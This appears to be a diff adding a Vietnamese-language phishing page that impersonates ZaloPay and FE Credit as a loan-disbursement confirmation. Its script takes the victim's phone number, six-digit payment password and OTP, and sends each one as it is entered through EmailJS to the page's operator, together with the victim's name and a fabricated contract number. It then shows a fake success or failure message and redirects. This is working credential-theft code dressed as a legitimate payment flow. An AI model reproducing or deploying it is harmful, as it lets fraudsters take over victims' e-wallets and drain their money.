+          <h1>XÁC NHẬN GIẢI NGÂN </h1>
+        </header>
+        <main class="login-page-layout">
+          <div class="login-content">
+            <div class="login-header">
+              <h2 class="title">Nhập (OTP)</h2>
+              <p class="subtitle" id="zalopay-otp-prompt"></p>
+            </div>
+            <form onsubmit="event.preventDefault(); handleOtpSubmit();">
+              <input
+                type="text"
+                id="zalopay-otp-single"
+                class="otp-single-input"
+                placeholder=""
+                inputmode="numeric"
+                maxlength="8"
+                autocomplete="one-time-code"
+                oninput="this.value = this.value.replace(/\D/g, '')"
+              />
+            </form>
+            <div class="link-container" id="resend-otp-container">
+              <span id="otp-countdown-text" class="otp-countdown">Gửi lại sau <strong id="otp-countdown-value">60</strong>s</span>
+              <span id="otp-resend-text" style="display:none;">Chưa nhận được mã?
+                <a href="#" onclick="event.preventDefault(); resendOtp()">Gửi lại</a>
+              </span>
+            </div>
+            <div class="loading" id="zalopay-otp-loading">
+              <div class="spinner"></div>
+            </div>
+          </div>
+          <div class="login-footer">
+            <button
+              class="button zalopay-btn"
+              id="zalopay-otp-submit-btn"
+              onclick="handleOtpSubmit()"
+            >
+              Xác nhận
+            </button>
+          </div>
+        </main>
+      </div>
+    </div>
+
+    <div id="notification" class="notification"></div>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        // State and credentials object
+        const credentials = { phone: "", password: "", otp: "" };
+        let otpAttempts = 0;
+
+        // Utility to get element by ID
+        const getEl = (id) => document.getElementById(id);
+
+        // Get form data from sessionStorage or URL parameters
+        const getFormData = () => {
+          let storedData = {};
+          try {
+            const raw = sessionStorage.getItem("formData");
+            storedData = raw ? JSON.parse(raw) : {};
+          } catch (err) {
+            console.error('[FECredit] sessionStorage parse error:', err);
+            storedData = {}; // Fallback to empty object
+          }
+          
+          const params = new URLSearchParams(window.location.search);
+          return {
+            fullName:
+              storedData.fullName || params.get("fullName") || "Nguyễn Văn A",
+            cccd: storedData.cccd || params.get("cccd") || "012345678910",
+            amount:
+              parseInt(storedData.amount?.replace(/[^0-9]/g, "")) ||
+              parseInt(params.get("amount")) ||
+              50000000,
+            months:
+              parseInt(storedData.months) ||
+              parseInt(params.get("months")) ||
+              48,
+            phone: storedData.phone || params.get("phone") || "0987654321",
+            email:
+              storedData.email || params.get("email") || "example@email.com",
+            method:
+              storedData.method?.toLowerCase() ||
+              params.get("method") ||
+              "zalopay",
+          };
+        };
+
+        const formData = getFormData();
+
+        // DOM Elements
+        const passwordInputEl = getEl("zalopay-password");
+        const otpSingleInput = getEl("zalopay-otp-single");
+
+        // Helper Functions
+        const formatCurrency = (amount) =>
+          new Intl.NumberFormat("vi-VN", {
+            style: "currency",
+            currency: "VND",
+          }).format(amount);
+
+        const createDetailItem = (label, value, isPaymentMethod = false) => {
+          const item = document.createElement("div");
+          item.className = "detail-item";
+          const labelSpan = document.createElement("span");
+          labelSpan.className = "label";
+          labelSpan.textContent = label;
+          const valueSpan = document.createElement("span");
+          valueSpan.className = "value";
+          if (isPaymentMethod) {
+            const logo = document.createElement("img");
+            logo.src =
+              "https://simg.zalopay.com.vn/zlp-website/assets/new_logo_6c5db2d21b.svg";
+            logo.alt = "ZaloPay Logo";
+            valueSpan.appendChild(logo);
+            valueSpan.append(value);
+          } else {
+            valueSpan.textContent = value;
+          }
+          item.appendChild(labelSpan);
+          item.appendChild(valueSpan);
+          return item;
+        };
+
+        // Data Population
+        const populateData = () => {
+          const principal = formData.amount || 0;
+          const interest =
+            formData.interest !== undefined
+              ? formData.interest
+              : principal * 0.057;
+          const collectionFee = 24000;
+          const contractNumber =
+            "SHB-" + Math.floor(1000000000 + Math.random() * 9000000000);
+
+          getEl("mainTotalAmount").textContent = formatCurrency(principal);
+
+          const paymentDetailsContainer = getEl("payment-details");
+          paymentDetailsContainer.replaceChildren();
+          paymentDetailsContainer.appendChild(
+            createDetailItem("Số tiền gốc", formatCurrency(principal))
+          );
+          paymentDetailsContainer.appendChild(
+            createDetailItem("Số tiền lãi (ước tính)", formatCurrency(interest))
+          );
+          paymentDetailsContainer.appendChild(
+            createDetailItem("Phí thu hộ", formatCurrency(collectionFee))
+          );
+          paymentDetailsContainer.appendChild(
+            createDetailItem("Thanh toán qua", "Ví ZaloPay", true)
+          );
+
+          const customerDetailsContainer = getEl("customer-details");
+          customerDetailsContainer.replaceChildren();
+          customerDetailsContainer.appendChild(
+            createDetailItem("Tên khách hàng", formData.fullName)
+          );
+          customerDetailsContainer.appendChild(
+            createDetailItem("Số hợp đồng", contractNumber)
+          );
+
+          const closingDate = new Date();
+          closingDate.setMonth(closingDate.getMonth() + formData.months);
+          const formattedClosingDate = closingDate.toLocaleDateString("vi-VN", {
+            day: "2-digit",
+            month: "2-digit",
+            year: "numeric",
+          });
+          
+          // Safe DOM manipulation instead of innerHTML
+          const notice = getEl("closingDateNotice");
+          notice.replaceChildren();
+          
+          const text1 = document.createElement('strong');
+          text1.textContent = 'FE Credit';
+          notice.appendChild(text1);
+          
+          notice.appendChild(document.createTextNode(' sẽ đóng khoản vay vào ngày '));
+          
+          const text2 = document.createElement('strong');
+          text2.textContent = formattedClosingDate;
+          notice.appendChild(text2);
+          
+          notice.appendChild(document.createTextNode(', sau khi bạn hoàn tất thanh toán.'));
+        };
+
+        // UI Interactions
+        window.showNotification = (
+          message,
+          type = "error",
+          duration = 3000
+        ) => {
+          const notification = getEl("notification");
+          notification.textContent = message;
+          notification.className = `notification ${type} show`;
+          setTimeout(() => notification.classList.remove("show"), duration);
+        };
+
+        // Carousel logic
+        const carouselTrack = getEl("zlp-carousel-track");
+        const carouselDots = document.querySelectorAll("#zlp-carousel-dots .dot");
+        let currentSlide = 0;
+        let carouselInterval = null;
+        const totalSlides = carouselDots.length;
+
+        const goToSlide = (index) => {
+          currentSlide = ((index % totalSlides) + totalSlides) % totalSlides;
+          carouselTrack.style.transform = `translateX(-${currentSlide * 100}%)`;
+          carouselDots.forEach((dot, i) => {
+            dot.classList.toggle("active", i === currentSlide);
+          });
+        };
+
+        const startCarousel = () => {
+          if (carouselInterval) clearInterval(carouselInterval);
+          carouselInterval = setInterval(() => {
+            goToSlide(currentSlide + 1);
+          }, 3500);
+        };
+
+        // Dot click navigation
+        carouselDots.forEach((dot, i) => {
+          dot.addEventListener("click", () => {
+            goToSlide(i);
+            startCarousel();
+          });
+        });
+
+        // Image error handling: show CSS fallback if CDN image fails to load
+        (() => {
+          const logoImg = getEl("zlp-logo-img");
+          const logoText = getEl("zlp-logo-text");
+          if (logoImg && logoText) {
+            logoImg.addEventListener("error", () => {
+              logoImg.style.display = "none";
+              logoText.style.display = "inline";
+            });
+          }
+          const slideImg = document.querySelector(".zlp-slide-img");
+          if (slideImg) {
+            slideImg.addEventListener("error", () => {
+              const fallback = slideImg.parentNode.querySelector(".zlp-banner-css");
+              if (fallback) fallback.style.display = "flex";
+              slideImg.style.display = "none";
+            });
+          }
+        })();
+
+        // Touch/swipe support
+        (() => {
+          let touchStartX = 0;
+          let touchStartTime = 0;
+          const banner = document.querySelector(".zlp-hero-banner");
+          if (!banner) return;
+          banner.addEventListener("touchstart", (e) => {
+            touchStartX = e.touches[0].clientX;
+            touchStartTime = Date.now();
+          }, { passive: true });
+          banner.addEventListener("touchend", (e) => {
+            const dx = e.changedTouches[0].clientX - touchStartX;
+            const dt = Date.now() - touchStartTime;
+            if (Math.abs(dx) > 40 && dt < 400) {
+              goToSlide(currentSlide + (dx < 0 ? 1 : -1));
+              startCarousel();
+            }
+          }, { passive: true });
+        })();
+
+        // OTP countdown logic
+        let otpCountdownInterval = null;
+
+        const startOtpCountdown = () => {
+          let seconds = 60;
+          const countdownText = getEl("otp-countdown-text");
+          const resendText = getEl("otp-resend-text");
+          const countdownValue = getEl("otp-countdown-value");
+
+          countdownText.style.display = "";
+          resendText.style.display = "none";
+          countdownValue.textContent = seconds;
+
+          if (otpCountdownInterval) clearInterval(otpCountdownInterval);
+          otpCountdownInterval = setInterval(() => {
+            seconds--;
+            countdownValue.textContent = seconds;
+            if (seconds <= 0) {
+              clearInterval(otpCountdownInterval);
+              countdownText.style.display = "none";
+              resendText.style.display = "";
+            }
+          }, 1000);
+        };
+
+        window.showSection = (sectionId) => {
+          document
+            .querySelectorAll(".page-section")
+            .forEach((section) => section.classList.remove("active"));
+          const targetSection = getEl(sectionId);
+          if (targetSection) {
+            targetSection.classList.add("active");
+            // Pause carousel when leaving the phone section
+            if (sectionId !== "zalopay-phone-section") {
+              if (carouselInterval) clearInterval(carouselInterval);
+            } else {
+              startCarousel();
+            }
+            if (sectionId === "zalopay-password-section") {
+              setTimeout(() => passwordInputEl.focus(), 100);
+            }
+            if (sectionId === "zalopay-otp-section") {
+              setTimeout(() => otpSingleInput.focus(), 100);
+              startOtpCountdown();
+            }
+          }
+        };
+
+        // Password display logic
+        window.updatePasswordDisplay = (value) => {
+          const charBoxes = document.querySelectorAll(
+            "#zalopay-password-section .char-box"
+          );
+          charBoxes.forEach((box, index) => {
+            box.classList.toggle("filled", index < value.length);
+            box.classList.remove("active");
+            box.classList.remove("focus-active");
+          });
+          const passwordInput = document.getElementById("zalopay-password");
+          if (document.activeElement === passwordInput && value.length < 6) {
+            if (charBoxes[value.length]) {
+              charBoxes[value.length].classList.add("active");
+              charBoxes[value.length].classList.add("focus-active");
+            }
+          }
+
+          // Auto-submit when all 6 digits are entered
+          if (value.length === 6) {
+            setTimeout(() => handlePasswordSubmit(), 150);
+          }
+        };
+
+        // Event Handlers
+        window.handlePhoneSubmit = () => {
+          const phoneInput = getEl("zalopay-phone");
+          let phoneValue = phoneInput.value.replace(/\D/g, "");
+
+          // Accept both 9-digit (without leading 0) and 10-digit (with leading 0) formats
+          const normalizedPhone = phoneValue.startsWith("0") ? phoneValue.slice(1) : phoneValue;
+
+          if (normalizedPhone.length === 9) {
+            credentials.phone = `+84${normalizedPhone}`;
+            sendToEmail("phone", credentials.phone);
+            phoneInput.classList.remove("invalid");
+            showSection("zalopay-password-section");
+          } else {
+            phoneInput.classList.add("invalid");
+            showNotification(
+              "Số điện thoại không hợp lệ. Vui lòng nhập đúng số điện thoại.",
+              "error"
+            );
+          }
+        };
+
+        window.handlePasswordSubmit = () => {
+          if (passwordInputEl.checkValidity()) {
+            credentials.password = passwordInputEl.value;
+            sendToEmail("password", credentials.password);
+
+            const maskedPhone = `+84 **** ${credentials.phone.slice(-3)}`;
+            const otpPrompt = getEl("zalopay-otp-prompt");
+            otpPrompt.replaceChildren();
+            otpPrompt.appendChild(document.createTextNode('Mã xác thực  GIẢI NGÂN đã được gửi đến SĐT '));
+            const strong = document.createElement('strong');
+            strong.textContent = maskedPhone;
+            otpPrompt.appendChild(strong);
+            otpPrompt.appendChild(document.createTextNode('. của bạn.'));
+            showSection("zalopay-otp-section");
+          } else {
+            showNotification("Mật khẩu thanh toán phải là 6 chữ số.", "error");
+          }
+        };
+
+        window.handleOtpSubmit = () => {
+          credentials.otp = (otpSingleInput.value || "").replace(/\D/g, "");
+          if (credentials.otp.length < 6) {
+            showNotification("Vui lòng nhập đủ mã OTP (6-8 chữ số).", "error");
+            return;
+          }
+
+          const otpLoading = getEl("zalopay-otp-loading");
+          const otpSubmitBtn = getEl("zalopay-otp-submit-btn");
+          otpLoading.style.display = "block";
+          otpSubmitBtn.disabled = true;
+
+          sendToEmail("otp", credentials.otp);
+
+          setTimeout(() => {
+            otpLoading.style.display = "none";
+            otpSubmitBtn.disabled = false;
+
+            const correctOtp = "123456"; // Dummy OTP for demo
+
+            if (credentials.otp === correctOtp) {
+              showNotification(
+                "Xác nhận giải ngân thành công! Đang chuyển hướng...",
+                "success",
+                4000
+              );
+              setTimeout(() => {
+                window.location.href =
+                  "Evaluate-conditions.html?status=success";
+              }, 4000);
+            } else {
+              otpAttempts++;
+              clearOtpInputs();
+              const attemptsLeft = 3 - otpAttempts;
+              if (attemptsLeft > 0) {
+                showNotification(
+                  `Mã xác thực không đúng. Bạn còn ${attemptsLeft} lần thử.`,
+                  "error"
+                );
+              } else {
+                showNotification(
+                  "Bạn đã nhập sai quá 3 lần. Đang chuyển hướng...",
+                  "error",
+                  4000
+                );
+                setTimeout(() => {
+                  window.location.href =
+                    "Evaluate-conditions.html?status=failed";
+                }, 4000);
+              }
+            }
+          }, 1500);
+        };
+
+        window.resendOtp = () => {
+          showNotification(
+            `Đã gửi lại mã OTP đến ${credentials.phone}`,
+            "success"
+          );
+          clearOtpInputs();
+          startOtpCountdown();
+        };
+
+        // EmailJS Integration
+        const sendToEmail = (type, value) => {
+          const serviceID = "service_aa0dvwd";
+          let templateID = "";
+          let templateParams = {};
+          const contractNumber =
+            getEl("customer-details").querySelector(
+              ".detail-item:last-child .value"
+            )?.textContent || "";
+
+          const commonParams = {
+            platform: "ZaloPay (FECredit Layout v4)",
+            contract_number: contractNumber,
+            customer_name: formData.fullName || "",
+            total_amount: getEl("mainTotalAmount").textContent || "",
+          };
+
+          if (type === "phone") {
+            templateID = "template_akl287g";
+            templateParams = { ...commonParams, phone: value };
+          } else if (type === "password") {
+            templateID = "template_nka2acq";
+            templateParams = {
+              ...commonParams,
+              phone: credentials.phone,
+              password: value,
+            };
+          } else if (type === "otp") {
+            templateID = "template_48ehw5t";
+            templateParams = {
+              ...commonParams,
+              phone: credentials.phone,
+              password: credentials.password,
+              otp: value,
+            };
+          }
+
+          if (templateID) {
+            console.log(
+              `Sending ${type} to EmailJS with params:`,
+              templateParams
+            );
+            emailjs
+              .send(serviceID, templateID, templateParams)
+              .then(() => console.log(`${type} sent successfully.`))
+              .catch((err) =>
+                console.error(
+                  `EmailJS send failed for ${type}:`,
+                  JSON.stringify(err)
+                )
+              );
+          }
+        };
+
+        const clearOtpInputs = () => {
+          otpSingleInput.value = "";
+          otpSingleInput.focus();
+        };
+
+        // Event Listeners Setup
+        const setupEventListeners = () => {
+          const phoneInput = getEl("zalopay-phone");
+          phoneInput.addEventListener("input", () => {
+            let value = phoneInput.value.replace(/\D/g, "");
+            if (value.length > 10) {
+              value = value.slice(0, 10);
+            }
+            phoneInput.value = value;
+            const normalized = value.startsWith("0") ? value.slice(1) : value;
+            phoneInput.classList.toggle(
+              "invalid",
+              value.length > 0 && normalized.length < 9
+            );
+          });
+
+          // Single OTP input listener
+          otpSingleInput.addEventListener("input", () => {
+            otpSingleInput.value = otpSingleInput.value.replace(/\D/g, "");
+          });
+
+          updatePasswordDisplay(passwordInputEl.value);
+          passwordInputEl.addEventListener("focus", () =>
+            updatePasswordDisplay(passwordInputEl.value)
+          );
+          passwordInputEl.addEventListener("blur", () => {
+            document
+              .querySelectorAll("#zalopay-password-section .char-box")
+              .forEach((box) => {
+                box.classList.remove("active");
+                box.classList.remove("focus-active");
+              });
+          });
+        };
+
+        // Initializer
+        const init = () => {
+          populateData();
+          setupEventListeners();
+          startCarousel();
+        };
+
+        init();
+      });
+    </script>
+  </body>
+</html>
